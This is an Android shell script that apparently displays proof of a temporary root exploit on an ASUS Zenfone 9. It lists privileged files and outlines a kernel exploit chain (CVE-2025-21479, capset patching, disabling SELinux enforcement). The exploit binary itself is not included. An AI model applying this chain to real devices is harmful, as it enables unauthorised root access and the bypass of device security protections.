#!/system/bin/sh
# proof.sh — runs AS ROOT (uid 0 with our own SELinux domain preserved) and renders/announces the
# proof. Executed via: /data/local/tmp/call_capset sh /data/local/tmp/proof.sh
OUT=/data/local/tmp/root-proof.txt
HTML=/sdcard/root-proof.html
CTX=$(cat /proc/self/attr/current 2>/dev/null)

{
  echo "=== ROOT PROOF - ASUS Zenfone 9 (AI2202), bootloader LOCKED ==="
  echo; echo "\$ id"; id
  echo; echo "\$ cat /proc/self/attr/current"; echo "$CTX"
  echo; echo "\$ getenforce"; getenforce
  echo; echo "\$ head -3 /proc/kallsyms          # denied to unrooted shell"; head -3 /proc/kallsyms
  echo; echo "\$ ls /data/data | head -5         # denied to unrooted shell"; ls /data/data | head -5
  echo; echo "\$ ls /dev/block/by-name | head -5 # denied to unrooted shell"; ls /dev/block/by-name | head -5
  echo; echo "\$ cat /proc/sys/kernel/kptr_restrict"; cat /proc/sys/kernel/kptr_restrict
  echo
  echo "chain: CVE-2025-21479 (GPU SMMU TTBR0 hijack) -> perf_event physical-address leak -> arbitrary"
  echo "       physical R/W -> __do_sys_capset patched with prepare_creds + memcpy(init_cred ids/caps)"
  echo "       + commit_creds  =>  uid 0, full caps, our own SELinux SID kept (not the kernel domain)"
  echo "       + selinux_state byte 0 cleared => permissive"
} > "$OUT" 2>&1
cat "$OUT"

{
  echo '<!doctype html><meta charset=utf-8><body style="background:#0b0f14;color:#d7ffe0;'
  echo 'font-family:monospace;font-size:26px;padding:28px;line-height:1.45">'
  echo '<div style="font-size:52px;color:#57ff8a;font-weight:bold">&#10003; ROOT (temporary)</div>'
  echo "<div style=\"color:#8ab4f8;margin-bottom:18px\">uid=0(root) &middot; context=$CTX &middot; ASUS Zenfone 9 (AI2202), bootloader locked</div>"
  echo '<pre style="white-space:pre-wrap">'
  sed -e 's/&/\&amp;/g' -e 's/</\&lt;/g' "$OUT"
  echo '</pre></body>'
} > "$HTML" 2>&1
chmod 644 "$HTML" 2>/dev/null

cmd notification post -S bigtext -t "Temporary root OK - uid 0" ksuroot \
  "uid=0(root) context=$CTX - CVE-2025-21479 capset patch on ASUS Zenfone 9 (AI2202), bootloader locked" >/dev/null 2>&1
echo "[proof] wrote $OUT and $HTML ; notification posted"
